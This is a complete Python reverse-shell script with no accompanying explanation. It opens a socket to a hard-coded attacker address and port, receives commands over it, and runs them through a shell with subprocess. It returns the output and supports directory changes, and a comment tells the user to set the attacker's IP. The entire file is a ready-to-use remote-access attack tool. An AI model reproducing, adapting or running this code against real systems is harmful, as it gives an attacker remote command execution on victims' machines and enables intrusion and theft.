import socket
import subprocess
import os

# Change to your attacker's IP and port
ATTACKER_IP = "192.168.1.100"
ATTACKER_PORT = 4444

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ATTACKER_IP, ATTACKER_PORT))
    s.send(b"[+] Connection established!\n")

    while True:
        command = s.recv(1024).decode().strip()
        if command.lower() == "exit":
            break
        if command.startswith("cd "):
            try:
                os.chdir(command[3:].strip())
                s.send(b"Changed directory.\n")
            except FileNotFoundError:
                s.send(b"Directory not found.\n")
            continue
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            output = e.output
        if not output:
            output = b"Command executed.\n"
        s.send(output)
    s.close()

connect()
